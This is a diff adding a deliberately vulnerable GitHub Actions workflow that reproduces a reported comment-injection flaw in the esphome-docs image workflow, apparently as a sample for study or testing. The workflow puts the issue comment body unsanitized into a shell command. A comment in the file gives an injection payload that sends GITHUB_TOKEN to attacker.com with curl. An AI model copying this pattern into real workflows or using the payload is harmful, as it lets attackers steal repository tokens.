@@ -1,0 +1,31 @@
+# GHSL-2025-106: Code injection in esphome/esphome-docs component-image.yml
+# Vulnerability: Unsanitized comment body in shell command
+# Affected: .github/workflows/component-image.yml
+# Reference: https://securitylab.github.com/advisories/GHSL-2025-106_esphome_esphome-docs/
+
+name: Component Image (Vulnerable)
+
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  pull-requests: write
+
+jobs:
+  generate-image:
+    if: contains(github.event.comment.body, '/generate-image')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # VULNERABLE: Comment body directly assigned to shell variable
+      - name: Parse comment
+        run: |
+          comment="${{ github.event.comment.body }}"
+          echo "Processing: $comment"
+          # Attacker can inject: /generate-image"; curl attacker.com?t=$GITHUB_TOKEN; echo "
+
+      - name: Generate image
+        run: |
+          python generate_image.py
